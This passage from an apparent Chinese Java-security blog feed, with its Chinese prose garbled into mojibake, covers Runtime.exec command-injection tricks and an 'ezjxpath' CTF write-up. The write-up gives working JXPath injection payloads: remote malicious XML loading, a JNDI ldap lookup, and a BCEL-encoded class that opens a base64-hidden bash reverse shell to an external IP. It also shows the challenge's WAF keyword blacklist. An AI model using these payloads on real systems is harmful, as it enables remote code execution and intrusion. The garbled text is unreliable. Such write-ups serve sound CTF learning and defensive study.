alt="image-20230715112450381"></p><p>ç°åœ¨æœ‰å¦‚ä¸‹ä¸€ä¸ªæµ‹è¯•ï¼Œæˆ‘ä»¬æƒ³æ‰§è¡Œ<code>echo test123 &gt; test.txt</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec5</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;echo test123 &gt; test.txt&quot;</span>).getInputStream();</span><br><span class="line">    <span class="type">byte</span>[] res = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    is.read(res);</span><br><span class="line">    System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(res));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯æ— æ³•æˆåŠŸæ‰§è¡Œçš„ï¼Œæ­£ç¡®ä½¿ç”¨æ–¹æ³•åº”è¯¥æ·»åŠ ä¸Š<code>cmd /c</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec5</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cmd /c echo test123 &gt; test.txt&quot;</span>).getInputStream();</span><br><span class="line">    <span class="type">byte</span>[] res = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    is.read(res);</span><br><span class="line">    System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(res));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸå› æ˜¯echoä¸ºcmdçš„å†…ç½®å‘½ä»¤ï¼Œæ‰€ä»¥å¦‚æœæƒ³æ‰§è¡Œechoå‘½ä»¤å†™æ–‡ä»¶éœ€è¦å…ˆå¯åŠ¨cmd.exeï¼Œå°†echoå‘½ä»¤åšä¸ºcmd.exeçš„å‚æ•°ä»è€Œæ‰§è¡Œï¼Œæ‰€ä»¥åœ¨Windowsç¯å¢ƒä¸‹ï¼Œä½¿ç”¨Runtime.getRuntime()æ‰§è¡Œçš„å‘½ä»¤æ—¶æœ€å¥½åŠ ä¸Š<code>cmd /c</code></p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>å‰é¢å¤„ç†éƒ¨åˆ†å’Œwindowsä¸‹æ— å·®ï¼Œé‡ç‚¹å…³æ³¨ä¸‹é¢ä¸ä¸€æ ·çš„éƒ¨åˆ†ï¼Œä»¥ä¸‹é¢è¿™æ®µä»£ç ä¸ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Linux_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;;echo test &gt; test.txt&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">Command</span> <span class="operator">=</span> <span class="string">&quot;ping 127.0.0.1&quot;</span>+cmd;</span><br><span class="line">        Runtime.getRuntime().exec(Command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å–<code>cmdarry[0]</code>ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå…¶åé¢éƒ¨åˆ†ä¸ºå‘½ä»¤æ‰§è¡Œçš„å‚æ•°ï¼Œå¹¶èµ‹å€¼ç»™argsæ•°ç»„</p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112456180.png" alt="image-20230715112456180"></p><p>ç„¶åå°†å¤„ç†å¥½çš„å‚æ•°ä¼ ç»™<code>UNIXProcess</code>çš„æ„é€ æ–¹æ³•</p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112510051.png" alt="image-20230715112510051"></p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112505268.png" alt="image-20230715112505268"></p><p>è¿™é‡Œçš„progæ˜¯éœ€è¦æ‰§è¡Œçš„å‘½ä»¤<code>ping</code>ï¼Œ<code>argBlock</code>æ•°ç»„ä¸ºå…¶å‚æ•°</p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112514731.png" alt="image-20230715112514731"></p><p>åœ¨ç»è¿‡<code>StringTokenizer </code>å¯¹å­—ç¬¦ä¸²çš„å¤„ç†å è‚‰çœ¼å¯è§å¤šäº†å‡ ä¸ªä¸å¯è§å­—ç¬¦ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤ä¸å¯æ‰§è¡Œ</p><p><code>doPrivileged</code>è¿›å»ååŒæ ·æ˜¯ä¸ªnativeæ–¹æ³•ï¼Œåé¢å»è°ƒç”¨xxx.c</p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112520165.png" alt="image-20230715112520165"></p><p>æŠŠä¸Šé¢çš„ä»£ç æ‹¿ä¸‹æ¥æ¢æˆæ•°ç»„å½¢å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Linux_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;;echo test &gt; test.txt&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">Command</span> <span class="operator">=</span> <span class="string">&quot;ping 127.0.0.1&quot;</span>+cmd;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, Command&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ProcessBuilderä¸­æœ‰å‡ ä¸ªæ„é€ æ–¹æ³•ï¼Œä¼ å…¥å­—ç¬¦ä¸²æ—¶ä¼šè¢«åˆ†å‰²ï¼Œä¼ å…¥æ•°ç»„æ—¶ç›´æ¥<code>this.command = command</code>ï¼Œé¿å…äº†åˆ†å‰²çš„æ­¥éª¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.command = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(command.length);</span><br><span class="line">    <span class="keyword">for</span> (String arg : command)</span><br><span class="line">        <span class="built_in">this</span>.command.add(arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(List&lt;String&gt; command)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (command == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    <span class="built_in">this</span>.command = command;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112525075.png" alt="image-20230715112525075"></p><p>å¦‚æ­¤å°±èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤äº†ï¼Œåœ¨Linuxä¸‹ï¼Œè¿˜å¯ä»¥ç›´æ¥ä½¿ç”¨base64åŠ å¯†çš„æ–¹æ³•ï¼Œä¸ä¼šè¢«<code>StringTokenizer</code>å¤„ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Linux_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">Command</span> <span class="operator">=</span> <span class="string">&quot;bash -c &#123;echo,cGluZyAxMjcuMC4wLjE7ZWNobyB0ZXN0ID50ZXN0LnR4dA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line">        Runtime.getRuntime().exec(Command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ezjxpath</title>
      <link href="/2023/07/07/ezjxpath/"/>
      <url>/2023/07/07/ezjxpath/</url>
      
        <content type="html"><![CDATA[<h1 id="ezjxpath"><a href="#ezjxpath" class="headerlink" title="ezjxpath"></a>ezjxpath</h1><p>å¸¸è§ä¸‰ç§åˆ©ç”¨ç±»å‹</p><h2 id="åˆ›å»ºå¯¹è±¡çš„åˆ©ç”¨"><a href="#åˆ›å»ºå¯¹è±¡çš„åˆ©ç”¨" class="headerlink" title="åˆ›å»ºå¯¹è±¡çš„åˆ©ç”¨"></a>åˆ›å»ºå¯¹è±¡çš„åˆ©ç”¨</h2><p>åˆ©ç”¨Springä¸‹çš„<code>ClassPathXmlApplicationContext</code>ç±»åŠ è½½è¿œç¨‹æ¶æ„XMLå¯¼è‡´RCE</p><p><strong>demo</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext.new(\&quot;http://127.0.0.1:9000/Evil.xml\&quot;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Evil.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCcfbjO"><img src="https://s1.ax1x.com/2023/07/07/pCcfbjO.png" alt="pCcfbjO.png"></a></p><h2 id="é™æ€æ–¹æ³•è°ƒç”¨çš„åˆ©ç”¨"><a href="#é™æ€æ–¹æ³•è°ƒç”¨çš„åˆ©ç”¨" class="headerlink" title="é™æ€æ–¹æ³•è°ƒç”¨çš„åˆ©ç”¨"></a>é™æ€æ–¹æ³•è°ƒç”¨çš„åˆ©ç”¨</h2><p>åˆ©ç”¨<code>javax.naming.InitialContext#doLookup</code>é€ æˆjndiæ³¨å…¥</p><p><strong>demo</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezjxpath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.jxpath.JXPathContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">            context.getValue(<span class="string">&quot;javax.naming.InitialContext.doLookup(&#x27;ldap://127.0.0.1:1389/q7m3kb&#x27;)&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCc5S6f"><img src="https://s1.ax1x.com/2023/07/07/pCc5S6f.png" alt="pCc5S6f.png"></a></p><h2 id="è°ƒç”¨æ™®é€šæ–¹æ³•çš„åˆ©ç”¨"><a href="#è°ƒç”¨æ™®é€šæ–¹æ³•çš„åˆ©ç”¨" class="headerlink" title="è°ƒç”¨æ™®é€šæ–¹æ³•çš„åˆ©ç”¨"></a>è°ƒç”¨æ™®é€šæ–¹æ³•çš„åˆ©ç”¨</h2><p>ç›´æ¥è°ƒç”¨æ™®é€šæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezjxpath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.jxpath.JXPathContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">            context.getValue(<span class="string">&quot;exec(java.lang.Runtime.getRuntime(), &#x27;calc&#x27;)&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCc5e10"><img src="https://s1.ax1x.com/2023/07/07/pCc5e10.png" alt="pCc5e10.png"></a></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><code>/hack</code>è·¯ç”±å­˜åœ¨ç›´æ¥çš„ä¸Šä¸‹æ–‡è°ƒç”¨</p><p><a href="https://imgse.com/i/pCc5mcV"><img src="https://s1.ax1x.com/2023/07/07/pCc5mcV.png" alt="pCc5mcV.png"></a></p><p>wafè¿‡æ»¤äº†ä¸Šè¿°ä¸‰ç§å¸¸ç”¨æ–¹å¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package com.example.first.utils;</span><br><span class="line"></span><br><span class="line">import java.io.UnsupportedEncodingException;</span><br><span class="line">import java.net.URLDecoder;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Arrays;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: app.jar:BOOT-INF/classes/com/example/first/utils/Waf.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Waf</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; blacklist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(Arrays.<span class="title function_ invoke__">asList</span>(<span class="string">&quot;java.lang&quot;</span>, <span class="string">&quot;Runtime&quot;</span>, <span class="string">&quot;org.springframework&quot;</span>, <span class="string">&quot;javax.naming&quot;</span>, <span class="string">&quot;Process&quot;</span>, <span class="string">&quot;ScriptEngineManager&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title function_ invoke__">check</span>(String s) throws UnsupportedEncodingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.<span class="title function_ invoke__">isEmpty</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String reals = URLDecoder.<span class="title function_ invoke__">decode</span>(s, <span class="string">&quot;UTF-8&quot;</span>).<span class="title function_ invoke__">toUpperCase</span>(Locale.ROOT);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; this.blacklist.<span class="title function_ invoke__">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (reals.<span class="title function_ invoke__">toUpperCase</span>(Locale.ROOT).<span class="title function_ invoke__">contains</span>(this.blacklist.<span class="title function_ invoke__">get</span>(i).<span class="title function_ invoke__">toUpperCase</span>(Locale.ROOT))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£æ³•ä¸º<a href="https://gh0st.vip/2023/01/15/%5B0ctf%202022%5Dhessian-only-jdk/">0ctf_hessian-only-jdk</a>ä¸­çš„éé¢„æœŸè§£æ³•ï¼š<code>com.sun.org.apache.bcel.internal.util.JavaWrapper#_mian</code>ä¸ºé™æ€æ–¹æ³•ï¼Œå…¶ä¸­è°ƒç”¨äº†<code>runMain</code>ï¼Œå…¶<code>loader.loadClass(class_name);</code>è¿›è¡Œç±»åŠ è½½æ“ä½œï¼Œä¸”å…¶loaderä¸º<code>bcel classloader</code>ï¼Œäºæ˜¯ä¹ï¼Œå¯ä»¥æ„é€ bcelå­—èŠ‚ç æ‰§è¡Œå‘½ä»¤ï¼Œå†ç”¨jxpathå»è°ƒç”¨_mainé™æ€æ–¹æ³•</p><p><strong>Evil.class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjcwLjIyMS4yMDYvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆä¸€ä¸‹bcelå­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezjxpath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">evil</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(evil.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨é™æ€æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=com.sun.org.apache.bcel.internal.util.JavaWrapper._main(split(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuR$dbn$d3$40$Q$3d$db8qc$CmS$u$94rI$v$S$v$q$f8$rB$a0$m$a4$a8$b4$Id$97$88$a0$d2$80$Q$da8$abxMlG$ce$sqR$faQ$bc$A$e2$81$P$e0$a3$Q$e3$U$d5H$94$95v$8e$e7$cc$cc$99$9d$91$7f$fe$fa$fe$D$40$N$b7$N$e4p$d9$c0$V$ac$_$e2j$82$h$3a$ae$e9$b8$ce$90$7b$y$D$a9$9e0d$ca$db$H$M$daN$d8$V$MK$96$M$c4$fe$c8$ef$88$e85$ef$f4$89$vZ$a1$c3$fb$H$3c$92$89$ff$87$d4$94$x$87$M$h$96$T$fa$a6$88$b9$3f$e8$LS$cc$bcx$c0$95k$ee$8ee$bf$ce$90$fd$e0s$Z0$ac$95$dfY$k$ls$b3$cf$83$9e$d9R$91$Mz$f5yO$k$f5$c6$M$abg$84$Z$8c$dd$d8$R$D$r$c3$60$a8$e3$G$c3$b2$z$94$hv$9b$3c$e2$beP$o$a2$f6F$x$iE$8e$d8$93$c9$93$f2I$d7$fb$89P$B$3a$Wu$dc$y$a0$84M$86$f7$j$3etKU$a7t$q$i7$ac$b4$fd$bd$Z$dfi$u$dej$dc$7b$n$l$7d$7c$7b$d8$kw$9f$edO$acY$_$b6$3cgby$cf$a7v$ab6$b5$9f$b6$c7$b6g$cf$ecic$d2$94$ed$f8$f8$d3$R$J$89$H$b5J$b5$7b$f2$edV$aa$f2$b8$80$5b$d8bX$ff$ef$o$e8$e5$e9t$_$3b$9ep$U$8d$9cR$a7c2$ac$a4$ec$abQ$a0$a4Oc$Z$3d$a1N$9dK$e5m$eb$9f$i$da$95$sb$e10$dc$v$9f$b1$e7$bf$a8f$U$3ab8$acc$TY$fa$_$92$b3$A$96l$8bl$9e$3c$93$90$Rf$ef$7e$F$fb$3c$P$hdss2$83sd$L$t$J$84$e7$J$f3$b8$80$r$8a$q$c5$P$e7b$80$f1$N$L$c5$cc$XhoR$F$830$a9$ca$93V$aab$60$Z$x$84E$ba$g1$ab$b8$98d$d1$c6$Ih$day$f9$dao$99$3fW$i$cd$C$A$A&#x27;,&#x27;,&#x27;))</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCcIe5d"><img src="https://s1.ax1x.com/2023/07/07/pCcIe5d.png" alt="pCcIe5d.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> jxpath </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 SCTF WEB</title>
      <link href="/2023/06/20/2023%20SCTF%20WEB/"/>
      <url>/2023/06/20/2023%20SCTF%20WEB/</url>
      
